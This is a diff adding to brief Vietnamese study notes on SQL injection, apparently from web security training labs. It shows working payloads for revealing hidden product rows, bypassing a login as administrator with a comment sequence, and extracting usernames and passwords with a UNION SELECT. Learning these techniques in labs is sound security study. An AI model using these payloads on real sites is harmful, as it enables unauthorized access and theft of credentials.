@@ -1,5 +1,20 @@
-Truy xuất dữ liệu ẩn bằng mệnh đề WHERE
+@Truy xuất dữ liệu ẩn bằng mệnh đề WHERE
 VD: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-(BURP )Bắt requests đổi category thành 
+(BURP)Bắt requests đổi category thành 
 '+OR+1=1--
 XONG
+
+@BYPASS LOGIN 
+VD:SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+(BURP) thay username thành administrator'--   và để mật khẩu trống sẽ thành:
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+#Dấu -- dùng để làm cho các code ở sau trở thành ghi chú.
+
+@Lấy dữ liệu từ các bảng cơ sở dữ liệu khác
+VD: SELECT name, description FROM products WHERE category = 'Gifts'
+Thay category thành 
+' UNION SELECT username, password FROM users--
+ĐƯỢC: 
+SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'
+LẤY username password trong bảng users 
+
